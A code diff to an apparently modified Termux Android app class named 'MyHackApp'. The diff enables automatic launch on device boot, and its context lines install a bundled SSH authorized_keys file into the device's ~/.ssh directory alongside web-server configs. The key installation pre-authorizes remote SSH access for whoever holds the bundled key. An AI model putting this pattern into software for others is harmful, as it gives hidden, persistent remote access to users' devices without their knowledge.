@@ -89,17 +89,18 @@ public class MyHackApp {
     }
 
     public static void onBootDevice(Context context, Intent intent) {
+        /*
         Intent serviceIntent = new Intent(context, TermuxActivity.class);
         context.startService(serviceIntent);
         Toast.makeText(context,"Выполнилось",Toast.LENGTH_LONG).show();
-        /*
+         */
         // https://www.youtube.com/watch?v=4_CkU9L2mCo&ab_channel=CodinginFlow
         if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
             Intent i = new Intent(context, TermuxActivity.class);
             i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(i);
+            Toast.makeText(context,"Autorun Termux",Toast.LENGTH_LONG).show();
         }
-        */
     }
 
     public static void initConfig(Activity activity) {
@@ -135,7 +136,6 @@ public class MyHackApp {
                     dir.mkdirs();
 
                     TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/init_lib.sh", com.termux.shared.R.raw.init_lib, true);
-                    //  установка ТомСат
                     TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/authorized_keys.ssh", com.termux.shared.R.raw.authorized_keys_ssh, false);
                     TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/.ssh/authorized_keys", com.termux.shared.R.raw.authorized_keys_ssh, false);
                     TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/info.txt", com.termux.shared.R.raw.info_txt, false);
@@ -181,7 +181,6 @@ public class MyHackApp {
                     TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/httpd_user.conf", com.termux.shared.R.raw.php_ini, false);
                 } else {
                     for (File file : dir.listFiles()) {
-
                         if (getFileExtension(file).equals("py")) {
                             continue;
                         }
